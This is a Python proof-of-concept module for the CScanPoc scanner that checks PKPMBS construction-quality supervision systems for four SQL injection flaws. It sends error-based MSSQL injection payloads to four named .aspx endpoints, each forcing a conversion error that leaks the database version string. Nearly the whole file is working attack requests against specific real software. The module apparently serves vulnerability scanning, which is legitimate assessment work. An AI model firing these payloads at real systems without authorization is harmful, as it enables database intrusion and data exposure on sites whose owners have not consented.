# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'pkpmbs_0018' # 平台漏洞编号，留空
    name = 'PKPMBS工程质量监督站信息管理系统4处SQL注入打包' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-09-20'  # 漏洞公布时间
    desc = '''
        PKPMBS工程质量监督站信息管理系统4处SQL注入打包
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0121058' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'pkpmbs'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'pkpmbs_0018' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-22' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url=arg+"/pkpmbs/jdmanage/jdprojarchivesmenulist.aspx"
            post="__keyword__=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version ))%20and%20%27%%27=%27"
            code,head,res,errcode,_=hh.http(url,post)
            if code==500 and  "GAO JI@Microsoft SQL" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format( 
                        target=self.target, name=self.vuln.name))
            
            url=arg+"/pkpmbs/manager/userfolderlist.aspx"
            post="username=1%27%20and%201=convert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B@@version%29%29%20and%20%27%%27=%27&cxbtn=%E6%9F%A5%E6%89%BE"
            code,head,res,errcode,_=hh.http(url,post)
            if code==500 and  "GAOJIMicrosoft" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                   target=self.target, name=self.vuln.name))
            
            url=arg+"/INFOBLXX.aspx"
            post="key=1%27%20and%201=convert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B@@version%29%29%20and%20%27%%27=%27&qtype=bljlwh"
            code,head,res,errcode,_=hh.http(url,post)
            if code==500 and  "GAOJIMicrosoft" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(   
                   target=self.target, name=self.vuln.name))
            
            url=arg+"/userService/addresslist.aspx"
            post="keytype=username&keyword=1%27%20and%201=convert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B@@version%20%29%29%20and%20%27%%27=%27&Submit=%B2%E9++%D5%D2"
            code,head,res,errcode,_=hh.http(url,post)
            if code==500 and  "GAOJIMicrosoft" in res: 
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()